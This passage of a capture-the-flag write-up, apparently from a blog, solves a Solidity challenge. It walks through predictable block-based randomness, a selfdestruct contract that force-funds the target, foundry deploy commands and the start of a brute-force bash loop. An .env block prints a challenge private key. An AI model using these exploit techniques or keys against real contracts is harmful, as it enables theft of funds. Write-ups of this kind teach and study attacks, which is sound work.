+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">_didPlayerWin</span>(<span style="color:#dbbc7f">uint8</span> guess, FightMode mode) <span style="color:#e67e80">internal</span> <span style="color:#e67e80">returns</span> (<span style="color:#dbbc7f">bool</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> raptor <span style="color:#7a8478">=</span> parkRaptorStrength;
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">if</span> (mode <span style="color:#7a8478">==</span> FightMode.Ranked) {
+</span></span><span style="display:flex;"><span>        raptor <span style="color:#7a8478">+=</span> <span style="color:#d699b6">100</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint8</span> roll <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">uint8</span>(<span style="color:#dbbc7f">uint256</span>(<span style="color:#d699b6">keccak256</span>(<span style="color:#d699b6">abi</span>.<span style="color:#d699b6">encodePacked</span>(<span style="color:#d699b6">block</span>.<span style="color:#d699b6">timestamp</span>, <span style="color:#d699b6">block</span>.prevrandao))) <span style="color:#7a8478">%</span> <span style="color:#d699b6">100</span>);
+</span></span><span style="display:flex;"><span>    emit rollPicked(roll);
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> totalPlayer <span style="color:#7a8478">=</span> PLAYER_STRENGTH <span style="color:#7a8478">+</span> roll;
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">return</span> (guess <span style="color:#7a8478">==</span> roll) <span style="color:#7a8478">&amp;&amp;</span> (totalPlayer <span style="color:#7a8478">&gt;</span> raptor);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we chose the mode <code>ranked</code>, raptor got 100 more of strength.</p>
+<p>Then a value <code>roll</code> is chosen based on the timestamp and prevrandao, value readable on the blockchain and take the value modulo 100.</p>
+<p>Then the roll is added to player strength and a last check is made.
+The function return True if :</p>
+<ul>
+<li>We correctly guess the <code>roll</code> value.</li>
+<li>And our total strength is above the raptor strength.</li>
+</ul>
+<p>One should know that :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plain" data-lang="plain"><span style="display:flex;"><span>PLAYER_STRENGTH = 470;
+</span></span><span style="display:flex;"><span>parkRaptorStrength = 500;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We need at least a roll of 31 to get over the raptor strength. And if we chose the mode <code>ranked</code>
+, the raptor got to 600 which we can&rsquo;t beat because the max roll value is 99.</p>
+<p>Now the <code>prepareArena</code></p>
+<h3 id="preparearena">prepareArena</h3>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">6
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">function</span> <span style="color:#b2c98f">prepareArena</span>() <span style="color:#e67e80">internal</span> <span style="color:#e67e80">view</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">uint256</span> currentBalance <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>).<span style="color:#d699b6">balance</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(currentBalance <span style="color:#7a8478">&gt;=</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">2</span> <span style="color:#e67e80">ether</span>, <span style="color:#b2c98f">&#34;Capital Audit: Stage 1 Failed.&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(currentBalance <span style="color:#7a8478">&gt;=</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">4</span> <span style="color:#e67e80">ether</span>, <span style="color:#b2c98f">&#34;Capital Audit: Stage 2 Failed.&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#d699b6">require</span>(currentBalance <span style="color:#7a8478">&gt;=</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">6</span> <span style="color:#e67e80">ether</span>, <span style="color:#b2c98f">&#34;Capital Audit: Stage 3 Failed.&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The contract exit if we the arena balance is under 0.6 ether.
+Whis is at 0.5 ether at the start, here from the DinoPark contract which sends 0.5 ether at the creation :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">constructor</span>() <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>    owner <span style="color:#7a8478">=</span> <span style="color:#d699b6">msg</span>.<span style="color:#d699b6">sender</span>;
+</span></span><span style="display:flex;"><span>    goldenEggHolder <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>);
+</span></span><span style="display:flex;"><span>    arena <span style="color:#7a8478">=</span> <span style="color:#e67e80">new</span> Arena{<span style="color:#d699b6">value</span><span style="color:#7a8478">:</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">5</span> <span style="color:#e67e80">ether</span>}(<span style="color:#dbbc7f">address</span>(<span style="color:#d699b6">this</span>));
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Every other functions are just rabbit holes and baits that did not work on me because I stand on bait proof.</p>
+<p><img src="../../images/bait_functions.gif" alt="bait functions"></p>
+<h3 id="how-to-solve-in-a-nutshell">How to solve in a nutshell</h3>
+<p>Here&rsquo;s is a drawing of the path to solve :</p>
+<p><img src="../../images/writeups/wwctf/solve_dinosaur.png" alt="solve path"></p>
+<p>Let&rsquo;s solve then.</p>
+<hr>
+<h1 id="solve">Solve</h1>
+<p>SO the step are :</p>
+<ul>
+<li>fund arena with some ether so we can fight</li>
+<li>call fight by trying to get the correct guess and be champion with our address</li>
+<li>find a way to empty the arena balance</li>
+<li>claim the goldern egg</li>
+</ul>
+<h2 id="fund-arena">Fund arena</h2>
+<p>There are multiple to fund an address on th ethereum, for example :</p>
+<ul>
+<li>Deploying a contract with some ether so the deployed gets it in its balance</li>
+<li>Send it to a function with the modifier <code>payable</code> state</li>
+<li>If the address is a wallet (or EOA), just make a transaction with ether in msg.value variable</li>
+</ul>
+<p>In our case none of this works because the arena, is already deployed, doesn&rsquo;t have any payable function, and is not a wallet.</p>
+<p>So the author wrote the contract so the arena &ldquo;refuse&rdquo; funds.</p>
+<p><img src="../../images/writeups/wwctf/no-ethers-please.png" alt="no ethers"></p>
+<p>BUT, there is an old trick to force a contract to receive fund which <a href="https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#deactivate-and-self-destruct">selfdestructing</a>, which send all the remaining ethers of a contract to the address we want.</p>
+<p>Then we write a contract, give it the ethers we want and send call selfdestruct to make it sends the values :</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">selfdestructing</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#859289;font-style:italic">// SPDX-License-Identifier: UNLICENSED
+</span></span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic"></span><span style="color:#e67e80">pragma solidity</span> <span style="color:#7a8478">^</span><span style="color:#d699b6">0</span>.<span style="color:#d699b6">8</span>.<span style="color:#d699b6">19</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;./Arena.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">import</span> <span style="color:#b2c98f">&#34;./DinoPark.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">contract</span> SendEthers {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#dbbc7f">address</span> <span style="color:#e67e80">payable</span> <span style="color:#e67e80">public</span>  to;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">constructor</span>(<span style="color:#dbbc7f">address</span> <span style="color:#e67e80">payable</span> _to)  <span style="color:#e67e80">payable</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">require</span>(<span style="color:#d699b6">msg</span>.<span style="color:#d699b6">value</span> <span style="color:#7a8478">==</span> <span style="color:#d699b6">0</span>.<span style="color:#d699b6">2</span> <span style="color:#e67e80">ether</span>, <span style="color:#b2c98f">&#34;send 0.2 ether&#34;</span>);
+</span></span><span style="display:flex;"><span>        to <span style="color:#7a8478">=</span> _to;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#e67e80">function</span> <span style="color:#b2c98f">tqt</span>() <span style="color:#e67e80">public</span> <span style="color:#e67e80">payable</span> 
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>        <span style="color:#d699b6">selfdestruct</span>(to);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>So we caan deploy the contract and specify the address of arena as the destination. On a terminal using <a href="https://getfoundry.sh/">foundry</a> :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">8
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#859289;font-style:italic">#balance is at 0.5 ether</span>
+</span></span><span style="display:flex;"><span>cast balance -r $RPC $ARENA --ether
+</span></span><span style="display:flex;"><span>0.500000000000000000
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>forge create Evil.sol:Attack -r $RPC --root . --broadcast --private-key $PKEY --value 0.2ether --constructor-args $ARENA  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cast balance -r $RPC $ARENA --ether
+</span></span><span style="display:flex;"><span>0.700000000000000000
+</span></span></code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>I&rsquo;ve put all my adresses in a <code>.env</code> file and source it so it&rsquo;s easier, see :
+<br> <br></p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>cat .env                              
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>RPC<span style="color:#7a8478">=</span>http://chal.wwctf.com:8545/c54e4d94-6e4d-4410-b2f3-0de796911eb6
+</span></span><span style="display:flex;"><span>ADDRESS<span style="color:#7a8478">=</span>0x05B0f7fb2165143Ffc4fA3687aC9f1c7e49126cE
+</span></span><span style="display:flex;"><span>PKEY<span style="color:#7a8478">=</span>0xd0ce3938132dbb601a856cf7e84ab49a1ad898ae9ba94997a1647cd42be076e1
+</span></span><span style="display:flex;"><span>SETUP<span style="color:#7a8478">=</span>0xAd8C328A4C8235AA56395ee52C172DB3e4E8A266
+</span></span><span style="display:flex;"><span><span style="color:#d699b6">export</span> ARENA<span style="color:#7a8478">=</span><span style="color:#e67e80">$(</span>cast call $SETUP -r $RPC <span style="color:#b2c98f">&#39;arena()(address)&#39;</span><span style="color:#e67e80">)</span>
+</span></span><span style="display:flex;"><span>ATTACK<span style="color:#7a8478">=</span>0x58269D9A90651088706baD2a3d65349237102877
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#d699b6">source</span> .env
+</span></span></code></pre></td></tr></table>
+</div>
+</div></blockquote>
+<p>Next step.</p>
+<h2 id="win-the-fight-and-have-a-correct-guess">Win the fight and have a correct guess</h2>
+<p>In the <code>fight</code> function  we got to submit a guess and a fight mode.
+First the fight mode is either <code>normal</code> or <code>ranked</code> and we <a href="#_didplayerwin">saw earlier</a> that <code>ranked</code> is impossible to win.</p>
+<p>Here are the fight mode :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">enum</span> FightMode { Normal, Ranked }
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>An enum in solidity is just a list of uint8 that are called through the variable name.
+So Normal is accessed like <code>FIghtMode.Normal</code> and as it&rsquo;s the first item, it&rsquo;s value is 0.</p>
+<p>Next we need to guess correctly so that the validation function returns true :</p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#e67e80">return</span> (guess <span style="color:#7a8478">==</span> roll) <span style="color:#7a8478">&amp;&amp;</span> (totalPlayer <span style="color:#7a8478">&gt;</span> raptor);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And at the same time be above of raptor strength which is 500 and ours 470. So we need 31 &lt;= guess 100.</p>
+<p>Roll is picked on value that are guessable by writing the contract because there are read from the block of transaction; <a href="https://docs.soliditylang.org/en/latest/cheatsheet.html#block-and-transaction-properties">timestamp and prevrandao</a></p>
+<div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">1
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#dbbc7f">uint8</span> roll <span style="color:#7a8478">=</span> <span style="color:#dbbc7f">uint8</span>(<span style="color:#dbbc7f">uint256</span>(<span style="color:#d699b6">keccak256</span>(<span style="color:#d699b6">abi</span>.<span style="color:#d699b6">encodePacked</span>(<span style="color:#d699b6">block</span>.<span style="color:#d699b6">timestamp</span>, <span style="color:#d699b6">block</span>.prevrandao))) <span style="color:#7a8478">%</span> <span style="color:#d699b6">100</span>);
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If we call <code>fight()</code>, we make a transaction, and this transaction will be listed on the block. If in <code>fight()</code>, block value are called, it will take value from this block so it&rsquo;s totally readable and not random.</p>
+<p>But this tricks works when using a contract. To solve we need to directly use our EOA, so we can&rsquo;t guess anything, we have to do STRAIGHT gambling with a odds of 1% for having the correct number at each call.</p>
+<p>Someting I omitted is that the blockchain for challenge have blocks being mined every 10 seconds, so at every time I make a single transaction, I have to wait 10 seconds.</p>
+<p>Ain&rsquo;t no way I&rsquo;m waiting this long every time.</p>
+<img alt="eric abidal" src="/images/memes/eric-abidal-non.gif">
+<p>So I made a first bash script that call fight with the same number and wait 10 seconds and call again :</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">first_script.sh</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#e67e80">#!/bin/bash
+</span></span></span><span style="display:flex;"><span><span style="color:#e67e80"></span>
+</span></span><span style="display:flex;"><span><span style="color:#d699b6">source</span> .env
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">for</span> i in <span style="color:#7a8478">{</span>1..100<span style="color:#7a8478">}</span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">do</span>
